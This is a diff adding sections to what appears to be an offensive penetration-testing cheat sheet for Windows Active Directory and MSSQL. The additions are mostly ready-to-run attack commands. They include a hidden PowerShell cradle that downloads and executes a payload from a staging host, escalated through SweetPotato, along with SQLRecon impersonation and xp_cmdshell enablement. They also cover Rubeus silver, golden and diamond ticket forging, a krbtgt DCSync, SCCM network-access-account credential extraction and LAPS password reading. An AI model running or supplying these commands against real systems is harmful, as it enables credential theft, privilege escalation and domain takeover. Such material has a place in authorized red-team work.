@@ -280,6 +280,7 @@
 | KrbRelayUp | https://github.com/Dec0ne/KrbRelayUp |
 | Krbrelayx | https://github.com/dirkjanm/krbrelayx |
 | LAPSDumper | https://github.com/n00py/LAPSDumper |
+| LAPSToolkit | https://github.com/leoloobeek/LAPSToolkit |
 | LES | https://github.com/The-Z-Labs/linux-exploit-suggester |
 | LinEnum | https://github.com/rebootuser/LinEnum |
 | lsassy | https://github.com/Hackndo/lsassy |
@@ -325,6 +326,7 @@
 | ADSearch |  https://github.com/tomcarver16/ADSearch |
 | SUIDump | https://github.com/lypd0/SUIDump |
 | ldapdomaindump | https://github.com/dirkjanm/ldapdomaindump |
+| SharpSCCM | https://github.com/Mayyhem/SharpSCCM |
 
 ### Exploit Databases
 
@@ -1475,6 +1477,13 @@ smbclient -L //172.16.50.10/ -U <USERNAME> --password=<PASSWORD>
 ```c
 sudo systemctl start ssh
 xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
+```
+
+###### PORT FORDWARDING
+
+```c
+powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
+rportfwd 8080 127.0.0.1 80
 ```
 
 ###### WINDOWS JUMP SERVER
@@ -3734,8 +3743,34 @@ SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;
 
 Run impersonation
 
+Get system user
+
+```c
+powershell Invoke-SQLOSCmd -Instance "<INSTANCE>" -Command "whoami" -RawResults
+```
+
 ```c
 .\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:iwhoami /i:<SYSTEM_USER>
+```
+
+```c
+.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:ienablexp /i:<DEV\mssql_svc>
+.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:ixpcmd /i:<DEV\mssql_svc> /c:ipconfig //run commands with /c
+.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:links // see link servers
+.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:lquery /l:<LINKED_SERVERNAME> /c:"select @@servername"
+.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:lquery /l:<LINKED_SERVERNAME> /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"
+powershell Get-SQLServerLinkCrawl -Instance "<INSTANCE>"
+.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:lwhoami /l:<LINKED_SERVERNAME>
+```
+
+###### Run MSSQL Commands
+
+```c
+SELECT srvname, srvproduct, rpcout FROM master..sysservers;
+SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
+SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;
+EXECUTE AS login = '<SYSTEM_USER>'; SELECT SYSTEM_USER;
+EXECUTE AS login = '<SYSTEM_USER>'; SELECT IS_SRVROLEMEMBER('sysadmin');
 ```
 
 ##### Common Commands
@@ -3745,6 +3780,21 @@ SELECT @@version;
 SELECT name FROM sys.databases;
 SELECT * FROM <DATABASE>.information_schema.tables;
 SELECT * FROM <DATABASE>.dbo.users;
+SELECT * FROM OPENQUERY("<SQL_INSTANCE", 'select @@servername'); // query other db
+```
+
+###### Privelege Escalation
+
+Encode payload 
+
+```c
+$str = "iex (new-object net.webclient).downloadstring('http://wkstn-2:8080/b')"
+powershell -w hidden -c "iex (new-object net.webclient).downloadstring('http://wkstn-2:8080/b')"
+[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('Motörhead'))
+```
+
+```c
+\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc <ENCONDE>"
 ```
 
 ##### Show Database Content
@@ -3793,6 +3843,7 @@ SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DO
 ##### xp_cmdshell
 
 ```c
+SQL> SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell'; // current satate if 0 xp_cmdshell is disable
 SQL> EXECUTE AS LOGIN = 'sa';
 SQL> EXEC sp_configure 'Show Advanced Options', 1; 
 SQL> RECONFIGURE; 
@@ -5637,6 +5688,16 @@ klist
 iwr -UseDefaultCredentials http://<RHOST>
 ```
 
+With Rubeus, first get the ticket.kirbi
+
+```c
+.\Rubeus.exe silver /service:cifs/<COMPUTERNAME>.<DOMAIN> /aes256:<AESHASH> /user:<USERNAME> /domain:<DOMAIN> /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap
+```
+
+```c
+.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<USERNAME> /password:FakePass /ticket:<BASE^$_TICKET>
+```
+
 ###### Domain Controller Syncronization (DCSync)
 
 ###### Prerequisites
@@ -5825,12 +5886,37 @@ mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:S-1-5-21-1987
 mimikatz # misc::cmd
 ```
 
+GET the TICKET 
+
+```c
+dcsync <DOMAIN> DEV\krbtgt
+.\Rubeus.exe golden /aes256:<AESHASH> /user:<USERNAME> /domain:<DOMAIN> /sid:<SID> /nowrap
+```
+
+Get a session
+
+```c
+.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<USERNAME> /password:FakePass /ticket:<TICKET>
+```
+
 ###### Execution
 
 Use the `hostname` and not the `IP address` because otherwise it would authenticate via `NTLM` and the access would still be blocked.
 
 ```c
 .\PsExec.exe \\<RHOST> cmd
+```
+
+###### Diamond Tickets
+
+Get the ticket
+
+```c
+\Rubeus.exe diamond /tgtdeleg /ticketuser:<USERNAME> /ticketuserid:<RID_of_USER> /groups:512 /krbkey:<krbtgt AES256 hash> /nowrap
+```
+
+```c
+.\Rubeus.exe describe /ticket:<TICKET>
 ```
 
 ###### Volume Shadow Service (VSS) aka Shadow Copies
@@ -7973,6 +8059,33 @@ net localgroup Administrators henrial /add //add to admin group
 net group <GROUPNAME> <USERNAME> /add //add to a group
 ```
 
+##### Microsoft Configuration Manager
+
+```c
+.\SharpSCCM.exe local site-info --no-banner
+.\SharpSCCM.exe get site-info -d <DOMAIN> --no-banner
+.\SharpSCCM.exe get collections --no-banner
+powershell Get-WmiObject -Class SMS_Authority -Namespace root\CCM | select Name, CurrentManagementPoint | fl
+.\SharpSCCM.exe get class-instances SMS_Admin --no-banner // admin users
+.\SharpSCCM.exe get collection-members -n  <collection-name> --no-banner
+.\SharpSCCM.exe get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner
+\SharpSCCM.exe get devices -u <USER> -p IPAddresses -p IPSubnets -p Name --no-banner //last time a user logged in 
+```
+
+##### Network Access Account Credentials
+
+```c
+.\SharpSCCM.exe local naa -m wmi --no-banner
+```
+
+```c
+.\SharpSCCM.exe exec -n DEV -p C:\Windows\notepad.exe --no-banner
+```
+
+#### Domain Dominance
+
+
+
 ##### Access Control
 
 ###### S-R-X-Y Example
@@ -8212,6 +8325,23 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 
 ```c
 Get-ADComputer <RHOST> -property 'ms-mcs-admpwd'
+powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl // Powerview
+
+powershell Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName //Powerview
+```
+
+###### Reading ms-Mcs-AdmPwd
+
+Principals are allowed to read the ms-Mcs-AdmPwd attribute
+
+```c
+powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier
+powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd
+```
+
+```c
+.\LAPSToolkit.ps1
+Find-LAPSDelegatedGroups
 ```
 
 ###### Search the Registry for Passwords
